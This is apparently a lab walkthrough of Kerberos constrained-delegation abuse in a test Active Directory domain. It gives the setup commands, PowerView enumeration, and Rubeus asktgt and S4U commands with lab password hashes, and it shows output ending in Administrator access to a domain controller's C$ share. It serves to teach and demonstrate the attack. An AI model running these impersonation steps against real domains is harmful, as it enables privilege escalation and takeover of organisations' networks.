Thanks for : 

http://www.harmj0y.net/blog/activedirectory/s4u2pwnage/

https://github.com/GhostPack/Rubeus#constrained-delegation-abuse

# Setup

Firstly to setup the lab, create a regular user with gui.

After that set SPN and Delegation rights for that user with powershell

	PS C:\Users\Administrator> Get-ADUser -Identity lazyuser | Set-ADAccountControl -TrustedForDelegation $true
	PS C:\Users\Administrator> Set-ADUser -Identity lazyuser -ServicePrincipalNames @{Add='HTTP/webserver'}
	
Lastly setup constrained delegation for any service. In my case i will setup "cifs" service for domain controller

When all setup done you should see something like this. Two part is important "msds-allowedtodelegateto" and "TRUSTED_TO_AUTH_FOR_DELEGATION"

	PS C:\Users\testuser\Desktop> Get-NetUser -Identity lazyuser


	logoncount                    : 0
	badpasswordtime               : 1/1/1601 2:00:00 AM
	distinguishedname             : CN=lazy user,CN=Users,DC=child,DC=valhalla,DC=local
	objectclass                   : {top, person, organizationalPerson, user}
	displayname                   : lazy user
	userprincipalname             : lazyuser@child.valhalla.local
	name                          : lazy user
	objectsid                     : S-1-5-21-988250465-358338136-668553488-1107
	samaccountname                : lazyuser
	codepage                      : 0
	samaccounttype                : USER_OBJECT
	accountexpires                : NEVER
	countrycode                   : 0
	whenchanged                   : 12/28/2021 2:40:10 PM
	instancetype                  : 4
	usncreated                    : 13181
	objectguid                    : 05193cf1-5a18-4a1a-bedb-222a3b560912
	sn                            : user
	lastlogoff                    : 1/1/1601 2:00:00 AM
	msds-allowedtodelegateto      : {cifs/kabil.child.valhalla.local/child.valhalla.local,
									cifs/kabil.child.valhalla.local, cifs/KABIL, cifs/kabil.child.valhalla.local/CHILD...}
	objectcategory                : CN=Person,CN=Schema,CN=Configuration,DC=valhalla,DC=local
	dscorepropagationdata         : 1/1/1601 12:00:00 AM
	serviceprincipalname          : HTTP/webserver
	givenname                     : lazy
	lastlogon                     : 1/1/1601 2:00:00 AM
	badpwdcount                   : 0
	cn                            : lazy user
	useraccountcontrol            : NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD, TRUSTED_TO_AUTH_FOR_DELEGATION
	whencreated                   : 11/26/2021 8:01:30 AM
	primarygroupid                : 513
	pwdlastset                    : 11/26/2021 10:01:30 AM
	msds-supportedencryptiontypes : 0
	usnchanged                    : 16527

# Abuse

First i will check which accounts configured for constrained delegation

	PS C:\Users\testuser\Desktop> Get-DomainUser -TrustedToAuth | select samaccountname,msds-allowedtodelegateto,useraccount
	control | fl

	samaccountname           : lazyuser
	msds-allowedtodelegateto : {cifs/kabil.child.valhalla.local/child.valhalla.local, cifs/kabil.child.valhalla.local,
							   cifs/KABIL, cifs/kabil.child.valhalla.local/CHILD...}
	useraccountcontrol       : NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD, TRUSTED_TO_AUTH_FOR_DELEGATION

Lets say somehow we comprimised this account, it could be accounts password or kerberos ticket and session , all works i guess. To demontrate it, i will continue with comprimising account password.

I will request a kerberos ticket with Rubeus tool

	PS C:\Users\testuser\Desktop> .\Rubeus.exe asktgt /user:lazyuser /password:Pass123! /domain:child.valhalla.local /ptt
	
	[*] Action: Ask TGT

	[*] Using rc4_hmac hash: C718F548C75062ADA93250DB208D3178
	[*] Building AS-REQ (w/ preauth) for: 'child.valhalla.local\lazyuser'
	[+] TGT request successful!
	[*] base64(ticket.kirbi):

		  doIFWjCCBVagAwIBBaEDAgEWooIEVzCCBFNhggRPMIIES6ADAgEFoRYbFENISUxELlZBTEhBTExBLkxP
		  ...................
		  SEFMTEEuTE9DQUypKTAnoAMCAQKhIDAeGwZrcmJ0Z3QbFGNoaWxkLnZhbGhhbGxhLmxvY2Fs
	[+] Ticket successfully imported!

	  ServiceName              :  krbtgt/child.valhalla.local
	  ServiceRealm             :  CHILD.VALHALLA.LOCAL
	  UserName                 :  lazyuser
	  UserRealm                :  CHILD.VALHALLA.LOCAL
	  StartTime                :  12/28/2021 4:50:47 PM
	  EndTime                  :  12/29/2021 2:50:47 AM
	  RenewTill                :  1/4/2022 4:50:47 PM
	  Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
	  KeyType                  :  rc4_hmac
	  Base64(key)              :  xh8WabtikC0slL2NDOIsTQ==
	  ASREP (key)              :  C718F548C75062ADA93250DB208D3178

Check current tickets in session

	PS C:\Users\testuser\Desktop> klist
	Current LogonId is 0:0x58fd1
	Cached Tickets: (1)
	#0>     Client: lazyuser @ CHILD.VALHALLA.LOCAL
			Server: krbtgt/child.valhalla.local @ CHILD.VALHALLA.LOCAL
			KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
			Ticket Flags 0x40e10000 -> forwardable renewable initial pre_authent name_canonicalize
			Start Time: 12/28/2021 16:50:47 (local)
			End Time:   12/29/2021 2:50:47 (local)
			Renew Time: 1/4/2022 16:50:47 (local)
			Session Key Type: RSADSI RC4-HMAC(NT)
			Cache Flags: 0x1 -> PRIMARY
			Kdc Called:

It looks good. Now lets try to access "cifs" service.

	PS C:\Users\testuser\Desktop> dir \\kabil\c$
	dir : Access is denied
	At line:1 char:1
	+ dir \\kabil\c$
	+ ~~~~~~~~~~~~~~
		+ CategoryInfo          : PermissionDenied: (\\kabil\c$:String) [Get-ChildItem], UnauthorizedAccessException
		+ FullyQualifiedErrorId : ItemExistsUnauthorizedAccessError,Microsoft.PowerShell.Commands.GetChildItemCommand

	dir : Cannot find path '\\kabil\c$' because it does not exist.
	At line:1 char:1
	+ dir \\kabil\c$
	+ ~~~~~~~~~~~~~~
		+ CategoryInfo          : ObjectNotFound: (\\kabil\c$:String) [Get-ChildItem], ItemNotFoundException
		+ FullyQualifiedErrorId : PathNotFound,Microsoft.PowerShell.Commands.GetChildItemCommand


We got an error because our current user ("lazyuser") doesn't have rights to access "C\$" share. But good thing is this user configured for constrained delegation. So lets think who has access rights to "C\$"... Domain admins ofc. :)

First lets check domain admins group members

	PS C:\Users\testuser\Desktop> Get-DomainGroupMember -Identity "Domain Admins"  | select MemberName

	MemberName
	----------
	superuser
	Administrator


Okay there is 2 users. We can use either of them. Lets continue with administrator. Actually flow is simple:

Normally "Administrator" user asks "lazyuser" to "i want to access this service" and "lazyuser" talks with KDC and says "Someone wants to access service, gimme a ticket for him." Since we are already "lazyuser" why not use a little lie and ask ticket :)

Normally we have clear password of user but rubeus asks for "rc4", convert that hash to NTLM. Before starting lets remember which services "lazyuser" allowed to delegate

	PS C:\Users\testuser\Desktop> Get-DomainUser -Identity lazyuser -Properties samaccountname,msds-allowedtodelegateto | Se
	lect -Expand msds-allowedtodelegateto
	cifs/kabil.child.valhalla.local/child.valhalla.local
	cifs/kabil.child.valhalla.local
	cifs/KABIL
	cifs/kabil.child.valhalla.local/CHILD
	cifs/KABIL/CHILD
	
Okay overall:

clear all tickets

	PS C:\Users\testuser\Desktop> klist purge

	Current LogonId is 0:0x58fd1
			Deleting all tickets:
			Ticket(s) purged!
	PS C:\Users\testuser\Desktop> klist

	Current LogonId is 0:0x58fd1

	Cached Tickets: (0)
	
Request a ticket to access "c\$" share on behalf of "administrator"

	PS C:\Users\testuser\Desktop> .\Rubeus.exe s4u /user:lazyuser /rc4:C718F548C75062ADA93250DB208D3178 /impersonateuser:adm
	inistrator /domain:child.valhalla.local /msdsspn:"cifs/kabil" /altservice:cifs /ptt

	[*] Action: S4U

	[*] Using rc4_hmac hash: C718F548C75062ADA93250DB208D3178
	[*] Building AS-REQ (w/ preauth) for: 'child.valhalla.local\lazyuser'
	[+] TGT request successful!
	[*] base64(ticket.kirbi):

		  doIFWjCCBVagAwIBBaEDAgEWooIEVzCCBFNhggRPMIIES6ADAgEFoRYbFENISUxELlZBTEhBTExBLkxP
		  ........
		  SEFMTEEuTE9DQUypKTAnoAMCAQKhIDAeGwZrcmJ0Z3QbFGNoaWxkLnZhbGhhbGxhLmxvY2Fs


	[*] Action: S4U

	[*] Using domain controller: kabil.child.valhalla.local (192.168.200.200)
	[*] Building S4U2self request for: 'lazyuser@CHILD.VALHALLA.LOCAL'
	[*] Sending S4U2self request
	[+] S4U2self success!
	[*] Got a TGS for 'administrator' to 'lazyuser@CHILD.VALHALLA.LOCAL'
	[*] base64(ticket.kirbi):

		  doIFgDCCBXygAwIBBaEDAgEWooIEjDCCBIhhggSEMIIEgKADAgEFoRYbFENISUxELlZBTEhBTExBLkxP
		 ..........
		  TExBLkxPQ0FMqRUwE6ADAgEBoQwwChsIbGF6eXVzZXI=

	[*] Impersonating user 'administrator' to target SPN 'cifs/kabil'
	[*]   Final ticket will be for the alternate service 'cifs'
	[*] Using domain controller: kabil.child.valhalla.local (192.168.200.200)
	[*] Building S4U2proxy request for service: 'cifs/kabil'
	[*] Sending S4U2proxy request
	[+] S4U2proxy success!
	[*] Substituting alternative service name 'cifs'
	[*] base64(ticket.kirbi) for SPN 'cifs/kabil':

		  doIGKjCCBiagAwIBBaEDAgEWooIFMzCCBS9hggUrMIIFJ6ADAgEFoRYbFENISUxELlZBTEhBTExBLkxP
		 ............
		  oAMCAQKhDzANGwRjaWZzGwVrYWJpbA==
	[+] Ticket successfully imported!

Check tickets

	PS C:\Users\testuser\Desktop> klist

	Current LogonId is 0:0x34013

	Cached Tickets: (1)

	#0>     Client: administrator @ CHILD.VALHALLA.LOCAL
			Server: cifs/kabil @ CHILD.VALHALLA.LOCAL
			KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
			Ticket Flags 0x40a50000 -> forwardable renewable pre_authent ok_as_delegate name_canonicalize
			Start Time: 12/28/2021 17:28:48 (local)
			End Time:   12/29/2021 3:28:48 (local)
			Renew Time: 1/4/2022 17:28:48 (local)
			Session Key Type: AES-128-CTS-HMAC-SHA1-96
			Cache Flags: 0
			Kdc Called:

Access share

	PS C:\Users\testuser\Desktop> dir \\kabil\c$\


		Directory: \\kabil\c$


	Mode                LastWriteTime         Length Name
	----                -------------         ------ ----
	d-----        8/22/2013   5:52 PM                PerfLogs
	d-r---       12/12/2021   8:30 PM                Program Files
	d-----       11/26/2021   9:40 AM                Program Files (x86)
	d-r---       12/12/2021   8:21 PM                Users
	d-----       11/26/2021   9:10 AM                Windows
